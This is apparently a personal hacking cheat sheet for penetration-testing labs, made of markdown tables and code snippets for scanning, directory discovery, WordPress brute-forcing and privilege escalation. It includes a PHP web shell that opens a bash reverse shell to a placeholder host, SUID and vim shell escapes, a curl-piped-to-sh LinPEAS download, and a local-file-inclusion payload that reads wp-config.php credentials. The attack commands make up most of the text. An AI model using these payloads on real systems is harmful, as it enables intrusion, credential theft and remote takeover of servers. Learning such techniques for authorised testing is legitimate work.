# Hacking Notes  

## Configuration files: 
|Description                | Command                         |Syntax                 |
|----------------|-------------------------------|-----------------------------|
| Use of VPN | openvpn           |openvpn [FILE]            |
| Use of nmap | nmap           | nmap [IP]/[RANGE] [OPTIONS]            |
| UDP nmap scan | nmap           | nmap [IP]/[RANGE] -sU             |
| TCP nmap scan (no ping) | nmap           | nmap [IP]/[RANGE] -Pn             |
| Directory discovery | gobuster           | gobuster dir -u [URL] -w [WORDLIST e.g. /usr/share/wordlists/dirb/common.txt


## Web files: 
|Description                | Command                         |Syntax                 |
|----------------|-------------------------------|-----------------------------|
| Robots File | robots.txt           | [IP]/robots.txt        |

## Data format: 
|Description                | Command                         |Syntax                 |
|----------------|-------------------------------|-----------------------------|
| Get only strings | strings           | strings [FILE]        |

## Wordpress files
|Description                | Syntax Path|                     
|----------------|-------------------------------|
| Conf backupfile | [file].swp        |

## Access
|Description                | Syntax Path|                     
|----------------|-------------------------------|
|ftp | ftp [IP]       |
|ssh | ssh [IP]       |
| smbclient | smbclient -L \\\\[IP]\\[Directory] |

## Dictionaries
|Description                | Syntax Path|                     
|----------------|-------------------------------|
| cewl (Custom Word List generator) | cewl [URL] > [PWDFILE]       |


## Bruteforce

|Description                | Syntax Path|                     
|----------------|-------------------------------|
| hydra | hydra -L [USRFILE] -P [PWDFILE] [IP] -s [PORT] http-post-form "[url]:method=wp.getUsersBlogs&user=^USER^&password=^PASS^:Invalid" -V       |
| wordpress wpscan (using xmlrpc.php) | wpscan --url [URL] -U [USER] -P [PWDFILE]       |


## Privilege Escalation
Start HTTP Server: python3 -m http.server
Listen: nc -lvnp [PORT]

PHP Shell (Trigger)

```
<?php

if (isset($_GET['trigger'])) {
    exec("/bin/bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'");
}
Example: http://[IP]/wordpress/wp-content/themes/[THEME]/404.php?trigger=1)
```
Binaries
```
/usr/bin/dash -p
Path: /usr/bin/find. Exp: find . -exec /bin/sh -p \; -quit
```

LinPEAS
```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Escape  restricted environments (vim)
```
:!/bin/sh
:set shell=/bin/sh // :set shell=/bin/bash
:shell
```
## Port Scanning

One-liner
```
python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list(ipaddress.IPv4Network("[RANGE]").hosts())[100:200] for p in range(1,65535) if not socket.socket().connect_ex((str(ip),p))]' 
```

## Dynamic tunnel
Over Socks 5: ssh -D PORT [USER]@[IP]
![image](https://github.com/user-attachments/assets/bb6c4651-ac44-4144-9765-845565b9a826)

## Force the server to read and encode the file before processed
Example (with LFI, wp file) 
http://[IP]/lx.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php

## Check commands in a restricted shell
"TAB TAB"


